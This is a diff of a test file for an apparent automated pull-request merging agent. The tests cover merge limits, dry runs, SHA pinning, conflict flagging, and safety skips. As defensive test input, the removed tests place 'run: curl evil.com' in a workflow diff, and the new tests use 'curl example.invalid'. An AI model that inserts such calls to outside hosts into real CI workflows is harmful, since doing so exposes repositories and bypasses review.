@@ -1,80 +1,144 @@
-import { describe, it, expect } from "bun:test";
+import { afterEach, describe, it, expect, spyOn } from "bun:test";
+import { existsSync, readFileSync } from "node:fs";
+import { join } from "node:path";
 import { assessSafety } from "../../scripts/lib/pr-safety";
-import { resolveFileContent } from "../../scripts/lib/conflict-resolver";
+import { MAX_MERGES_PER_RUN, processPrs, resolveDryRun, type AgentDeps } from "../../scripts/pr-integration-agent";
 
-describe("pr-integration-agent integration (mocked)", () => {
-  it("SAFE MERGEABLE would be merged (safety passes)", () => {
-    const pr = {
-      number: 999,
-      title: "fix: typo in docs",
-      body: "Fix typo in docs/intro.md",
-      files: [{ path: "docs/intro.md", additions: 2, deletions: 2, changeType: "MODIFIED" } as any],
-      diff: `diff --git a/docs/intro.md b/docs/intro.md
+const REPO = join(import.meta.dir, "../..");
+const SHA = "0123456789abcdef0123456789abcdef01234567";
+const SAFE_DIFF = `diff --git a/docs/intro.md b/docs/intro.md
 -Introduciton
 +Introduction
-`,
-    };
-    const a = assessSafety(pr);
-    expect(a.verdict).toBe("SAFE");
-    // No conflict → merge path would proceed
+`;
+
+function pr(number: number, overrides: Record<string, unknown> = {}) {
+  return {
+    number,
+    title: "fix: typo in docs",
+    body: "Fix typo in docs/intro.md",
+    files: [{ path: "docs/intro.md", additions: 1, deletions: 1, changeType: "MODIFIED" }],
+    mergeable: "MERGEABLE",
+    headRefOid: SHA,
+    ...overrides,
+  };
+}
+
+function fakeDeps(diff = SAFE_DIFF) {
+  const merges: { number: number; strategy: string; sha: string }[] = [];
+  const deps: AgentDeps = {
+    getDiff: () => diff,
+    merge: (number, strategy, sha) => {
+      merges.push({ number, strategy, sha });
+      return `merged-${number}`;
+    },
+    refreshMergeable: () => "MERGEABLE",
+  };
+  return { deps, merges };
+}
+
+const spies: { mockRestore: () => void }[] = [];
+afterEach(() => {
+  while (spies.length) spies.pop()!.mockRestore();
+});
+
+describe("pr-integration-agent", () => {
+  it("SAFE assessment for a docs typo", () => {
+    expect(assessSafety({ number: 999, ...pr(999), diff: SAFE_DIFF } as any).verdict).toBe("SAFE");
   });
 
-  it("UNSAFE is skipped never merged", () => {
-    const pr = {
-      number: 1000,
-      title: "fix: typo",
-      body: "fix",
-      files: [{ path: ".github/workflows/deploy.yml", additions: 5, deletions: 0, changeType: "MODIFIED" } as any],
-      diff: `diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
-+  run: curl evil.com
-`,
-    };
-    const a = assessSafety(pr);
-    expect(a.verdict).toBe("UNSAFE");
-    expect(a.failedCriteria).toContain(6);
+  it("merges a SAFE mergeable PR with the head sha that was assessed", async () => {
+    const { deps, merges } = fakeDeps();
+    const rows = await processPrs([pr(10)], { strategy: "squash", dryRun: false, deps });
+
+    expect(merges).toEqual([{ number: 10, strategy: "squash", sha: SHA }]);
+    expect(rows[0]!.status).toBe("Merged");
+    expect(rows[0]!.hash).toBe("merged-10");
   });
 
-  it("conflict resolution preserves both sides additively", () => {
-    const content = `header
-<<<<<<< HEAD
-function fooA(){ return 1; }
-=======
-function fooB(){ return 2; }
->>>>>>> pr
-footer`;
-    const { resolved, hunks } = resolveFileContent(content, { number: 123, title: "add fooB" });
-    expect(resolved).toContain("fooA");
-    expect(resolved).toContain("fooB");
-    expect(resolved.length).toBeGreaterThan(content.length - 40); // markers replaced, but both functions kept
-    expect(hunks[0].type).toBe("additive");
+  it(`merges at most ${MAX_MERGES_PER_RUN} PRs per run and skips the rest with the cap as reason`, async () => {
+    const { deps, merges } = fakeDeps();
+    const rows = await processPrs([1, 2, 3, 4, 5].map((n) => pr(n)), { strategy: "squash", dryRun: false, deps });
+
+    expect(MAX_MERGES_PER_RUN).toBe(3);
+    expect(merges.map((m) => m.number)).toEqual([1, 2, 3]);
+    expect(rows.map((r) => r.status)).toEqual(["Merged", "Merged", "Merged", "Skipped", "Skipped"]);
+    expect(rows[3]!.reason).toContain("merge cap reached");
+    expect(rows[4]!.reason).toContain("merge cap reached");
   });
 
-  it("hard-rule guard: never force-push string absent", async () => {
-    const agentCode = await Bun.file("scripts/pr-integration-agent.ts").text();
-    expect(agentCode).not.toContain("push --force");
-    expect(agentCode).not.toContain("push -f");
-    expect(agentCode).toContain("guardNoForcePush");
-    expect(agentCode).toContain("guardNoHistoryRewrite");
+  it("flags a conflicting SAFE PR for manual resolution without merging or running any process", async () => {
+    const spawnSync = spyOn(Bun, "spawnSync");
+    const spawn = spyOn(Bun, "spawn");
+    spies.push(spawnSync, spawn);
+    const { deps, merges } = fakeDeps();
+
+    const rows = await processPrs([pr(20, { mergeable: "CONFLICTING" })], { strategy: "squash", dryRun: false, deps });
+
+    expect(rows[0]!.status).toBe("Flagged");
+    expect(rows[0]!.reason).toContain("needs manual resolution");
+    expect(merges).toEqual([]);
+    expect(spawnSync).not.toHaveBeenCalled();
+    expect(spawn).not.toHaveBeenCalled();
   });
 
-  it("re-assessment after resolution is SAFE for additive case", () => {
-    const content = `<<<<<<< HEAD
-const x = 1;
-=======
-const y = 2;
->>>>>>> pr`;
-    const { resolved } = resolveFileContent(content, { number: 124, title: "add y" });
-    const pr = {
-      number: 124,
-      title: "feat: add y constant",
-      body: "Add y constant in functions/lib/db.ts alongside x",
-      files: [{ path: "functions/lib/db.ts", additions: 2, deletions: 0, changeType: "MODIFIED" } as any],
-      diff: `diff --git a/functions/lib/db.ts b/functions/lib/db.ts
-+${resolved}
-`,
-    };
-    const a = assessSafety(pr);
-    // Should remain SAFE (no secrets, no config, additive)
-    expect(a.verdict).toBe("SAFE");
+  it("skips an UNSAFE PR and never merges it", async () => {
+    const { deps, merges } = fakeDeps(`diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
++  run: curl example.invalid
+`);
+    const rows = await processPrs(
+      [pr(30, { files: [{ path: ".github/workflows/deploy.yml", additions: 1, deletions: 0, changeType: "MODIFIED" }] })],
+      { strategy: "squash", dryRun: false, deps },
+    );
+
+    expect(rows[0]!.status).toBe("Skipped");
+    expect(rows[0]!.reason).toContain("UNSAFE");
+    expect(merges).toEqual([]);
+  });
+
+  it("a dry run merges nothing", async () => {
+    const { deps, merges } = fakeDeps();
+    const rows = await processPrs([pr(40), pr(41, { mergeable: "CONFLICTING" })], { strategy: "squash", dryRun: true, deps });
+
+    expect(merges).toEqual([]);
+    expect(rows.map((r) => r.status)).toEqual(["Flagged", "Flagged"]);
+  });
+
+  it("skips a PR without a head sha instead of merging it", async () => {
+    const { deps, merges } = fakeDeps();
+    const rows = await processPrs([pr(50, { headRefOid: undefined })], { strategy: "squash", dryRun: false, deps });
+
+    expect(merges).toEqual([]);
+    expect(rows[0]!.status).toBe("Skipped");
+  });
+
+  it("a PR whose mergeable state stays unknown is skipped, not merged", async () => {
+    const { deps, merges } = fakeDeps();
+    deps.refreshMergeable = () => "UNKNOWN";
+    const rows = await processPrs([pr(60, { mergeable: "UNKNOWN" })], { strategy: "squash", dryRun: false, deps });
+
+    expect(merges).toEqual([]);
+    expect(rows[0]!.status).toBe("Skipped");
+  });
+});
+
+describe("resolveDryRun", () => {
+  it("a scheduled run is always a dry run", () => {
+    expect(resolveDryRun(false, { GITHUB_EVENT_NAME: "schedule" })).toBe(true);
+  });
+
+  it("follows the flag outside a scheduled run", () => {
+    expect(resolveDryRun(false, { GITHUB_EVENT_NAME: "workflow_dispatch" })).toBe(false);
+    expect(resolveDryRun(true, {})).toBe(true);
+    expect(resolveDryRun(false, {})).toBe(false);
+  });
+});
+
+describe("agent source", () => {
+  it("runs no git command and the conflict resolver is gone", () => {
+    const code = readFileSync(join(REPO, "scripts/pr-integration-agent.ts"), "utf8");
+
+    expect(code).not.toMatch(/spawn(Sync)?\(\s*\[\s*"git"/);
+    expect(code).not.toContain("conflict-resolver");
+    expect(existsSync(join(REPO, "scripts/lib/conflict-resolver.ts"))).toBe(false);
   });
 });
